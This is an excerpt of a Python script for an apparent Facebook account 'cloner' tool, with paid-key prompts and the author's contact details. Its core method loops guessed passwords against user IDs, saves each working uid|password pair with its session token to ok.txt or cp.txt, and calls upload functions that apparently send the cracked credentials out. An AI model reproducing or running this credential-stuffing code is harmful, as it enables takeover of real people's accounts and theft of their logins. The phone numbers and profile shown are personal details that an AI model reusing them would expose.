...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/4d33L♥King-70/Approvel/main/200%20Tool"])
...
def notice():
	...
	runtxt("\n\033[0;91m🧞‍♀️BR0 UR N0T P4!D US3R ")
	runtxt("\033[0;93m 🔇 BR0 4PN! K3Y BUY KR0 CLICK KR WTSP PE SEND KRO>> %s%s"%(G,basesplit))
	runtxt("\033[0;92m ADMIN🧞‍♀️ WHATSAPP >> +923444819642")
	subprocess.check_output(["am", "start", "https://www.facebook.com/ved.baghel.39"])

def irfan():
	
	
	runtxt("\n\033[0;91m🧞‍This tool is offical for 4d33L♥King")
...
\033[1;90m═══════════════════════════════════════════════════════════
\033[1;94m [\033[1;94m✯\033[1;91m] \033[1;92mR34L N4M3 : 4d33L♥King 
\033[1;95m [\033[1;94m✯\033[1;91m] \033[1;92mWHATSUP : 03444819643
\033[1;93m [\033[1;94m✯\033[1;91m] \033[1;92mF4C3B00K   : SULM4N K4BIR
\033[1;97m [\033[1;94m✯\033[1;91m] \033[1;92mMSG  : F33L P0W3R SULM4N KABIRE
\033[1;90m═══════════════════════════════════════════════════════════
    """)
		print("%s [%s•%s] %sTOOL NAME : %s4D33L❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [4d33L♥King] : %s/%s -> \033[0;92m [ 4d33L♥King-OK:%s ]- \033[0;91m[4d33L♥King:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[4d33L♥King-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [4d33L♥King-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[4d33L♥King] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [4d33L♥King] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
